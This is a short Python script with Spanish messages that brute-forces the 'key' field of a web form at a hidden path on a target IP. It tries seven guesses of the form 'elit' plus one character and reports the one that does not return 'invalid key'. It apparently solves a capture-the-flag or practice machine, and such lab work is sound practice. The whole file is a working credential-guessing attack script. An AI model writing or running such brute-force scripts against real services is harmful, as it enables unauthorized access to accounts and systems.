#!/usr/bin/python3

import requests, time, sys
from pwn import *

ip=sys.argv[1]

main_url="http://%s/kzMb5nVYJw/index.php" %ip

def makeRequest():
	p1=log.progress("Fuerza bruta")
	p1.status("Realizando consultas")
	time.sleep(1)

	words=['1','a','q','w','e','f','k']

	for i in words:
		post_data = {
			'key' : 'elit%s' % i
		}

		p1.status("Probando password elit%s" %i)
		time.sleep(1)
		r = requests.post(main_url, data=post_data)

		if "invalid key" not in r.text:
			p1.success("La password es elit%s" %i)
			sys.exit(0)

if __name__=="__main__":
	makeRequest()
